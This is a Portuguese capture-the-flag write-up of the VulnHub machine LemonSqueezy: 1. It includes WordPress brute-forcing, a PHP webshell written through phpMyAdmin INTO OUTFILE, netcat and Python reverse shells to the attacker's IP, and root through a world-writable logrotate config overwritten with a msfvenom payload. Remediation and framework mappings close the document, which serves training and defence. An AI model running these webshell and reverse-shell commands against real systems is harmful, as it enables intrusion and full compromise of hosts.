# LemonSqueezy: 1 — Quando a Vida te Dá Misconfigs, Faça uma Root Shell

Bora rapaziada!! LemonSqueezy: 1 é uma máquina sensacional que empacota uma cadeia de ataque surpreendentemente profunda em um único serviço web exposto. Você tem enumeração WordPress, brute-force, credenciais escondidas em rascunhos de posts, phpMyAdmin com escrita de arquivo via SQL para entregar a webshell, e escalação de privilégios via cron com um config logrotate world-writable. Cada passo aqui mapeia para uma técnica real, e a cadeia é satisfatoriamente limpa. Sem exagero, a escalação via logrotate sozinha já vale fazer essa máquina, mano.

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | LemonSqueezy: 1 |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/lemonsqueezy-1,473/ |
| **Técnicas** | Nmap, dirb, WPScan user enumeration + brute-force, credencial em rascunho WordPress, phpMyAdmin SQL INTO OUTFILE webshell, reverse shell, escalonamento via cron + logrotate world-writable |
| **CVEs** | CWE-521 (senha fraca orange:ginger), CWE-312 (credencial em rascunho WordPress), CWE-89 (MySQL INTO OUTFILE), CWE-732 (logrotate world-writable executado por cron root) |
| **Grupos APT** | FIN7: exploração documentada de WordPress e phpMyAdmin em alvos de varejo e hospitalidade; APT41: usa mecanismos de persistência via cron em intrusões Linux para acesso de longo prazo |

---

## Resumo do Ataque

```
nmap → porta 80 apenas
  → dirb → /wordpress, /phpmyadmin
  → wpscan: usuários orange, lemon
  → brute-force orange: ginger
  → login WordPress admin: orange:ginger
  → Posts → rascunho → credencial em claro: nOt1n@wOrdl1st!
  → phpMyAdmin: orange:nOt1n@wOrdl1st!
  → SQL: SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php"
  → http://alvo/wordpress/backdoor.php?cmd=whoami → www-data
  → reverse shell: nc -e /bin/bash atacante 1234
  → python pty spawn + stty raw -echo
  → LinEnum.sh → /etc/crontab → logrotate a cada 2 min
  → ls -la /etc/logrotate.d/ → config logrotate world-writable
  → msfvenom payload → sobrescreve /etc/logrotate.d/logrotate
  → aguarda <2 min → callback root
  → cat /root/root.txt
```

---

## Metodologia

1. Scan de portas: apenas porta 80
2. Enumeração de diretórios: descoberta de /wordpress e /phpmyadmin
3. Enumeração de usuários WordPress e brute-force com WPScan
4. Descoberta de credencial em rascunho WordPress
5. Login phpMyAdmin com credenciais descobertas
6. MySQL INTO OUTFILE para escrever PHP webshell no web root
7. Execução da webshell e entrega de reverse shell
8. Estabilização do shell para acesso interativo
9. Enumeração automatizada com LinEnum para descobrir misconfigutação de cron
10. Exploração do config logrotate world-writable para shell root

---

## Passo 1 — Reconhecimento

```bash
sudo netdiscover
# Alvo: 192.168.1.105

nmap -A 192.168.1.105
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.x
```

Apenas a porta 80. HTTP é a única superfície de ataque.

```bash
echo "192.168.1.105 lemonsqueezy" >> /etc/hosts
```

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração de Diretórios

```bash
dirb http://192.168.1.105
gobuster dir -u http://192.168.1.105 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Encontrado:**
- `/wordpress` — instalação WordPress
- `/phpmyadmin` — painel phpMyAdmin

Ambos são achados críticos. WordPress dá o caminho de enumeração de usuários. phpMyAdmin dá o caminho de escrita de arquivo.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Enumeração de Usuários WordPress e Brute-Force

```bash
wpscan --url http://192.168.1.105/wordpress -e u
```

**Usuários encontrados:** `orange`, `lemon`

Brute-force da senha de `orange`:

```bash
wpscan --url http://192.168.1.105/wordpress \
  -U orange \
  -P /usr/share/wordlists/rockyou.txt \
  --password-attack xmlrpc
```

**Resultado:** `orange` / `ginger`

**Nota real:** Enumeração de usuários WordPress via `?author=1` ou API REST é uma técnica documentada desativada por hardening adequado. WPScan automatiza isso. A senha `ginger` está no top 10.000 do rockyou.txt, por isso o brute-force funciona em minutos. FIN7 usa rotineiramente enumeração estilo WPScan como primeiro passo contra alvos WordPress.

**MITRE ATT&CK:** T1589.001 — Coleta de Informações da Vítima: Credenciais; T1110.003 — Força Bruta: Password Spraying

---

## Passo 4 — Descoberta de Credencial em Rascunho WordPress

Login no admin WordPress em `http://192.168.1.105/wordpress/wp-admin/`:
- **Usuário:** `orange`
- **Senha:** `ginger`

Navegar até **Posts** e abrir qualquer rascunho existente no modo de edição. Ler o corpo do post com atenção.

**Credencial encontrada no conteúdo do post:** `nOt1n@wOrdl1st!`

Esta é a senha phpMyAdmin para o usuário de banco de dados `orange`.

**Nota real:** Desenvolvedores e sysadmins frequentemente usam rascunhos de CMS como notepad temporário para credenciais, snippets de configuração e notas. O banco de dados WordPress armazena todo conteúdo de posts incluindo rascunhos em texto puro, então qualquer acesso ao banco (ou acesso a backup) expõe essas credenciais.

**MITRE ATT&CK:** T1552.001 — Credenciais Não Protegidas: Credenciais em Arquivos

---

## Passo 5 — phpMyAdmin Webshell via SQL INTO OUTFILE

Login no phpMyAdmin em `http://192.168.1.105/phpmyadmin/`:
- **Usuário:** `orange`
- **Senha:** `nOt1n@wOrdl1st!`

Selecionar o banco de dados WordPress. Abrir a aba **SQL**.

Usar a capacidade de escrita de arquivo do MySQL para dropar uma PHP webshell no web root:

```sql
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/wordpress/backdoor.php";
```

Verificar se a shell funciona:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=whoami
```

Saída esperada: `www-data`

**Como INTO OUTFILE funciona:** A instrução `INTO OUTFILE` do MySQL escreve o resultado de uma query SELECT em um arquivo no filesystem do servidor. Quando o processo MySQL tem permissão de escrita no web root e o privilégio `FILE` está concedido ao usuário do banco, qualquer query SQL pode criar arquivos arbitrários, incluindo PHP webshells.

**MITRE ATT&CK:** T1505.003 — Componente de Software Servidor: Web Shell; T1190 — Explorar Aplicação de Face Pública

---

## Passo 6 — Entrega de Reverse Shell

Iniciar listener no atacante:

```bash
nc -lvnp 1234
```

Disparar reverse shell via webshell:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=nc+-e+/bin/bash+192.168.1.112+1234
```

Se `nc -e` não estiver disponível, usar Python:

```
http://192.168.1.105/wordpress/backdoor.php?cmd=python3+-c+'import+socket,os,pty;s=socket.socket();s.connect(("192.168.1.112",1234));[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)];pty.spawn("/bin/bash")'
```

**MITRE ATT&CK:** T1059.004 — Shell Unix

---

## Passo 7 — Estabilização do Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
export SHELL=bash
# Ctrl+Z no atacante:
stty raw -echo; fg
# Enter duas vezes
```

Ler flag de usuário:

```bash
cat ~/user.txt
```

---

## Passo 8 — Enumeração Automatizada com LinEnum

Hospedar LinEnum no atacante:

```bash
python3 -m http.server 8000
```

Baixar e executar no alvo:

```bash
cd /var/www/html/wordpress
wget http://192.168.1.112:8000/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh | tee /tmp/linenum.txt
```

Revisar crontab:

```bash
cat /etc/crontab
```

Achado: um cron executa `logrotate` a cada 2 minutos.

Verificar o diretório de configs logrotate:

```bash
ls -la /etc/logrotate.d/
```

**Achado crítico:** `/etc/logrotate.d/logrotate` é world-writable (permissões 777 ou 666).

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron

---

## Passo 9 — Escalação de Privilégios via Cron com logrotate World-Writable

Gerar payload de reverse shell com msfvenom:

```bash
msfvenom -p cmd/unix/reverse_netcat LHOST=192.168.1.112 LPORT=4444 R
```

Copiar o payload gerado (parece com: `mkfifo /tmp/kqvh; nc ...`).

Sobrescrever o config logrotate no alvo com o payload:

```bash
echo '<output do msfvenom aqui>' > /etc/logrotate.d/logrotate
```

Iniciar listener para root shell no atacante:

```bash
nc -lvnp 4444
```

Aguardar até 2 minutos para o cron executar. Quando logrotate executa o arquivo de config como root, o payload dispara um callback root.

**Por que funciona:** logrotate lê configs de `/etc/logrotate.d/`. Se qualquer arquivo for world-writable, qualquer usuário pode sobrescrevê-lo com comandos arbitrários. Quando cron executa logrotate como root, esses comandos rodam como root. Isso é CWE-732: arquivo world-writable executado por processo privilegiado.

**MITRE ATT&CK:** T1053.003 — Tarefa Agendada: Cron; T1548.001 — Setuid e Setgid

---

## Passo 10 — Flag Root

Após o callback da root shell:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
cat root.txt
```

(☞ﾟヮﾟ)☞ Root. LemonSqueezy completamente espremido. gg, rapaziada!

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | orange:ginger | Brute-force WPScan | Admin WordPress |
| Credencial | orange:nOt1n@wOrdl1st! | Rascunho WordPress | Login phpMyAdmin |
| Webshell | /wordpress/backdoor.php | MySQL INTO OUTFILE | Execução de comandos OS |
| Shell inicial | www-data | Reverse shell via backdoor.php | Acesso ao web server |
| Flag usuário | user.txt | ~/user.txt | Prova de nível usuário |
| Shell root | uid=0(root) | logrotate world-writable cron | Acesso total ao sistema |
| Flag root | root.txt | /root/root.txt | Prova de nível root |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Senha WordPress orange:ginger vulnerável a brute-force | Senhas fracas em CMS são trivialmente quebradas; WPScan está amplamente disponível e é usado | Enforce senhas fortes; implemente bloqueio de conta; desabilite XML-RPC se não usado |
| 2 | Credenciais armazenadas em rascunho WordPress | Posts de rascunho em CMS são fonte consistente de descoberta de credenciais em engajamentos reais | Nunca use rascunhos CMS como notepad; use gerenciador de senhas ou solução de gestão de segredos |
| 3 | phpMyAdmin acessível publicamente | phpMyAdmin nunca deve ser exposto na internet; acesso equivalente a admin do banco permite criação de webshell | Vincular phpMyAdmin ao localhost; restringir com auth HTTP ou IP allowlist |
| 4 | MySQL INTO OUTFILE cria webshells | Privilégio FILE + web root gravável = criação de webshell por qualquer cliente SQL | Revogar privilégio FILE de todos os usuários de aplicação web; restringir MySQL a leitura do web root |
| 5 | /etc/logrotate.d/ world-writable executado por cron root | Padrão clássico de escalação de privilégios em ambientes container e VM | chown root:root /etc/logrotate.d/*; chmod 644; auditar cron com LinPEAS/LinEnum |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Password Spraying | T1110.003 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Explorar Aplicação de Face Pública | T1190 |
| Execução | Execução | Componente de Software Servidor: Web Shell | T1505.003 |
| Execução | Execução | Shell Unix | T1059.004 |
| Descoberta | Descoberta | Descoberta de Informações do Sistema | T1082 |
| Persistência | Persistência | Tarefa Agendada: Cron | T1053.003 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Enforce senhas fortes:** Habilitar proteção contra brute-force no WordPress; desabilitar XML-RPC se não necessário
2. **Auditar posts WordPress por credenciais:** Fazer grep em todas as tabelas post e postmeta por strings de credencial; implementar política de classificação de dados
3. **Restringir acesso phpMyAdmin:** Vincular a `127.0.0.1`; adicionar auth HTTP básica no Apache; implementar IP allowlist
4. **Revogar privilégio FILE do MySQL:** `REVOKE FILE ON *.* FROM 'orange'@'localhost';`; verificar que nenhum usuário de aplicação web tem privilégios SUPER ou FILE
5. **Corrigir permissões logrotate:** `chown root:root /etc/logrotate.d/*; chmod 644 /etc/logrotate.d/*`; implementar auditorias periódicas de permissão

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os painéis admin web-expostos (phpMyAdmin, wp-admin) |
| Proteger | Controle de Acesso | Restringir phpMyAdmin ao localhost; desabilitar XML-RPC |
| Proteger | Segurança de Dados | Sem credenciais em conteúdo CMS; revogar privilégio FILE |
| Detectar | Anomalias | Alertar em queries INTO OUTFILE; monitorar mudanças em cron; detectar webshells |
| Responder | Planejamento de Resposta | Remover webshell; rotacionar todas as credenciais; corrigir permissões logrotate |
| Recuperar | Planejamento de Recuperação | Auditar conteúdo WordPress por credenciais; reconstruir se acesso root alcançado |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Menor Privilégio | Privilégio FILE MySQL revogado; configs logrotate com dono root |
| IA-5 | Gestão de Autenticadores | Senhas fortes no WordPress; credenciais phpMyAdmin rotacionadas |
| CM-7 | Menor Funcionalidade | phpMyAdmin restrito ao localhost; XML-RPC desabilitado |
| CM-6 | Configurações | Configs logrotate world-writable: chmod 644 |
| SI-3 | Proteção Contra Malware | HIDS para detectar criação de webshell e modificação de cron |

### CISA KEV

Criação de webshell via MySQL INTO OUTFILE (padrão CWE-89/CWE-434) está referenciada no CISA Alert AA21-008A documentando TTPs de atores de ameaça para comprometimento de aplicação web. O padrão de escalação via config cron world-writable está alinhado com orientações CISA sobre prevenção de escalação de privilégios Linux. Organizações devem aplicar CISA AA22-279A sobre interfaces de gerenciamento acessíveis pela internet, incluindo phpMyAdmin.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Identidades e Credenciais | MIL3 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Gerenciar Vulnerabilidades | MIL2 |
| Consciência Situacional (SITUATION) | Implementar Logging | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (phpMyAdmin somente localhost; revogar privilégio FILE)
- **D3-OAM** — Gestão Administrativa do SO (corrigir permissões logrotate; restringir cron)
- **D3-DQSA** — Análise de String de Query de Banco de Dados (detectar padrões INTO OUTFILE em logs de query MySQL)
- **D3-FH** — Hashing de Arquivo (detectar criação de webshell no web root via monitoramento de integridade de arquivo)

---

## Considerações Finais

LemonSqueezy entrega uma cadeia de ataque limpa e em camadas que recompensa enumeração minuciosa em cada passo. A credencial no rascunho WordPress é o tipo de achado que faz profissionais de segurança balançar a cabeça, porque é incrivelmente comum em avaliações reais. A escalação via logrotate é um exemplo perfeito de como uma única permissão de arquivo mal configurada pode entregar root para qualquer usuário local.

A máquina ensina a olhar em todo lugar: enumeração de diretórios encontra phpMyAdmin, conteúdo de post revela credenciais, LinEnum encontra o cron, e auditoria de permissões revela o arquivo world-writable. Remova qualquer passo de enumeração e você trava a cadeia.

Thanks guys!! (❍ᴥ❍ʋ)
